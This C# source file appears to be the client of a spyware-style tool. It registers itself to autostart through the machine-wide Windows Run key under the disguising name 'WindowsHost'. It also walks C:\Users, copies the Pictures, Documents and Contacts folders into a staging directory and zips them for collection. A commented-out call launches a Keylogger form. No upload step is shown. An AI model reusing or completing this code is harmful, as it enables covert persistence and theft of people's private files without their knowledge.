using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;

namespace idpaClient
{

    class Program
    {
        private const string SCAN_PATH = @"C:\Users";
        private const string APP_PATH = @"C:\Temp";

        static void Main(string[] args)
        {
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Keylogger());

            //startFileScan();

            //DirectoryCopy(SCAN_PATH, APP_PATH, true);
            //zipFolder(APP_PATH);
        }

        static void setAutoStart()
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            regKey.SetValue("WindowsHost", "\"" + Application.ExecutablePath.ToString() + "\"");
        }

        static void startFileScan()
        {
            Console.ForegroundColor = ConsoleColor.Green;

            if (Directory.Exists(SCAN_PATH))
                ProcessDirectory(SCAN_PATH);
            else
                Console.WriteLine("{0} is not a valid file or directory.", SCAN_PATH);

            Console.ReadKey(true);
        }

        // Process all files in the directory passed in, recurse on any directories  
        // that are found, and process the files they contain. 
        public static void ProcessDirectory(string targetDirectory)
        {
            // Process the list of files found in the directory. 
            string[] fileEntries = Directory.GetFiles(targetDirectory);

            foreach (string fileName in fileEntries)
                ProcessFile(fileName);

            if (targetDirectory.Contains("Pictures") || targetDirectory.Contains("Documents") || targetDirectory.Contains("Contacts"))
            {
                string[] splittedDirectory = targetDirectory.Split('\\');
                string pathName = splittedDirectory[splittedDirectory.Length - 1];
                DirectoryCopy(targetDirectory, APP_PATH + @"\" + pathName, true);
            }

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
            {
                try
                {
                    ProcessDirectory(subdirectory);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Acces denied for '{0}'", subdirectory);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
            }
        }

        // Insert logic for processing found files here. 
        public static void ProcessFile(string path)
        {
            if (path.Contains("Pictures") || path.Contains("Documents") || path.Contains("Contacts"))
            {
                Console.BackgroundColor = ConsoleColor.Yellow;
            }
            Console.WriteLine("Processed file '{0}'.", path);
            Console.BackgroundColor = ConsoleColor.Black;
        }

        public static void zipFolder(string folder)
        {
            string zipPath = @"C:\temp.zip";

            ZipFile.CreateFromDirectory(folder, zipPath);
        }

        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                try
                {
                    file.CopyTo(temppath, false);
                }
                catch { }
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    try
                    {
                        DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                    }
                    catch { }
                }
            }
        }
    }
}
